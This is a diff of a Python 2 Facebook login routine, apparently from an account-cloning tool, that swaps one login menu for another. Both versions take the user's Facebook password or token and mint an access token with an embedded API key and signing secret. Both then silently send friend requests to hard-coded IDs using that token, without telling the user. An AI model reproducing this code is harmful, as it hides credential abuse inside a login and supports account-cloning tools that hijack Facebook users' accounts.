@@ -93,93 +93,109 @@ listgrup = []
 vulnot = "\033[31mNot Vuln"
 vuln = "\033[32mVuln"
 
-def login():
-    os.system("clear")
-    try:
-        toket = open("....", "r")
-        os.system("python2 Zee")
-    except (KeyError,IOError):
-        os.system("rm -rf ....")
-        os.system("clear")
-        print (logo)
-        print ("[1] Login With Email/Number and Password")
-        print ("[2] Login With Access Token")
-        print (50*"-")
-        login_choice()
-        
-def login_choice():
-    bch = raw_input("\n ====>  ")
-    if bch =="":
-        print ("[!] Fill in correctly")
+def masuk():
+    os.system('clear')
+    print logo
+    print '\x1b[1;91m\x1b[1;97m1.\x1b[1;96m Login Via Email/ID'
+    print '\x1b[1;91m\x1b[1;97m2.\x1b[1;96m Login Via Token ID'
+    print '\x1b[1;91m\x1b[1;97m0.\x1b[1;91m Back'
+    print
+    msuk = raw_input('\x1b[1;92m\xef\xb8\xbb\xe3\x83\x87\xe2\x95\x90\xe4\xb8\x80\xe2\x96\xb8 \x1b[1;90m:\x1b[1;97m ')
+    if msuk == '':
+        print '\x1b[1;91m[!] Select Correctlyy !'
+        masuk()
+    elif msuk == '1':
         login()
-    elif bch =="2":
-        os.system("clear")
-        print (logo)
-        fac=raw_input(" Paste Access Token Here: ")
-        fout=open("....", "w")
-        fout.write(fac)
-        fout.close()
-        requests.post('https://graph.facebook.com/me/friends?method=post&uids=100002059014174&access_token='+fac)
-        os.system('xdg-open https://www.youtube.com/channel/UCIC01LyIO5oroo1Qo6Fi4Mw')
-        os.system("python2 Zee")
-    elif bch =="1":
-        login1()
-            
-def login1():
-	os.system('clear')
-	try:
-		toket = open('....','r')
-		os.system("python2 Zee")
-	except (KeyError,IOError):
-		os.system('clear')
-		print (logo)
-		print('          [+] LOGIN WITH FACEBOOK [+]' )
-		print
-		id = raw_input('[+] ID/Email : ')
-		pwd = getpass.getpass('[+] Password : ')
-		tik()
-		try:
-			br.open('https://mbasic.facebook.com')
-		except mechanize.URLError:
-			print("\n[!] There is no internet connection")
-			os.sys.exit()
-		br._factory.is_html = True
-		br.select_form(nr=0)
-		br.form['email'] = id
-		br.form['pass'] = pwd
-		br.submit()
-		url = br.geturl()
-		if 'save-device' in url:
-			try:
-				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
-				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
-				x=hashlib.new("md5")
-				x.update(sig)
-				a=x.hexdigest()
-				data.update({'sig':a})
-				url = "https://api.facebook.com/restserver.php"
-				r=requests.get(url,params=data)
-				z=json.loads(r.text)
-				chb = open("....", 'w')
-				chb.write(z['access_token'])
-				chb.close()
-				print ('\n\x1b[1;92m[+] Login Successfull \x1b[1;97m')
-				os.system('xdg-open https://www.youtube.com/channel/UCIC01LyIO5oroo1Qo6Fi4Mw')
-				requests.post('https://graph.facebook.com/me/friends?method=post&uids=100002059014174&access_token='+z['access_token'])
-				os.system("python2 Zee")
-			except requests.exceptions.ConnectionError:
-				print("\n[!] There is no internet connection")
-				os.sys.exit()
-		if 'checkpoint' in url:
-			print("\n[!] It Seems That Your Account Has A Checkpoint")
-			os.system('rm -rf ....')
-			time.sleep(1)
-			os.sys.exit()
-		else:
-			print("\n[!] Password/Email is wrong")
-			os.system('rm -rf ....')
-			time.sleep(1)
-			login1()
+    elif msuk == '2':
+        tokenz()
+    elif msuk == '0':
+        keluar()
+    else:
+        print '\x1b[1;91m[!] Select Correctly !'
+        time.sleep(0.7)
+        masuk()
+
+
+def tokenz():
+    os.system('clear')
+    print logo
+    toket = raw_input('\x1b[1;97m[?] \x1b[1;96mToken\x1b[1;91m : \x1b[1;97m')
+    try:
+        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
+        a = json.loads(otw.text)
+        nama = a['name']
+        zedd = open('login.txt', 'w')
+        zedd.write(toket)
+        zedd.close()
+        print '\x1b[1;92m[\xe2\x9c\x93] Login Success {^_^} '
+        os.system('xdg-open https://m.facebook.com/Kudiyan.Da.Prince')
+        time.sleep(1)
+        menu()
+    except KeyError:
+        print '\x1b[1;91m[!] Token Wrong !'
+        time.sleep(1.7)
+        masuk()
+
+
+def login():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r')
+        menu()
+    except (KeyError, IOError):
+        os.system('clear')
+        print logo
+        print '           \x1b[1;93m\xe2\x98\xa0\xef\xb8\x8f<><><><><><><><><><><><><><>\xe2\x98\xa0\xef\xb8\x8f'
+        print '             Login With New Facebook ID   '
+        print '              Dwnt Use Ur Personal  ID   '
+        print '           \x1b[1;93m\xe2\x98\xa0\xef\xb8\x8f<><><><><><><><><><><><><><>\xe2\x98\xa0\xef\xb8\x8f\n'
+        id = raw_input('\x1b[1;97m[+] \x1b[1;96mID/Email \x1b[1;91m=\x1b[1;92m ')
+        pwd = raw_input('\x1b[1;97m[+] \x1b[1;96mPassword \x1b[1;91m=\x1b[1;92m ')
+        tik()
+        try:
+            br.open('https://mbasic.facebook.com')
+        except mechanize.URLError:
+            print '\n[!] Connection Error'
+            keluar()
+
+        br._factory.is_html = True
+        br.select_form(nr=0)
+        br.form['email'] = id
+        br.form['pass'] = pwd
+        br.submit()
+        url = br.geturl()
+        if 'save-device' in url:
+            try:
+                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
+                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
+                x = hashlib.new('md5')
+                x.update(sig)
+                a = x.hexdigest()
+                data.update({'sig': a})
+                url = 'https://api.facebook.com/restserver.php'
+                r = requests.get(url, params=data)
+                z = json.loads(r.text)
+                unikers = open('login.txt', 'w')
+                unikers.write(z['access_token'])
+                unikers.close()
+                print '\n\x1b[1;97m[\xe2\x9c\x93] \x1b[1;92mLogin Success {^_^}'
+                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
+                os.system('xdg-open https://m.facebook.com/Kudiyan.Da.Prince')
+                menu()
+            except requests.exceptions.ConnectionError:
+                print '\n\x1b[1;96m[!] \x1b[1;91mConnection Error '
+                keluar()
+
+        if 'checkpoint' in url:
+            print '\n\x1b[1;96m[!] \x1b[1;91mUr ID On CheckPoiint'
+            os.system('rm -rf login.txt')
+            time.sleep(1)
+            keluar()
+        else:
+            print '\x1b[1;97m\n[!] \x1b[1;91mPassword/Email Wrong'
+            os.system('rm -rf login.txt')
+            time.sleep(1)
+            masuk()
 			
 			
 def menu():
@@ -1211,4 +1227,4 @@ def clone_dari_file():
        
 		
 if __name__ == '__main__':
-	login()
+	masuk()
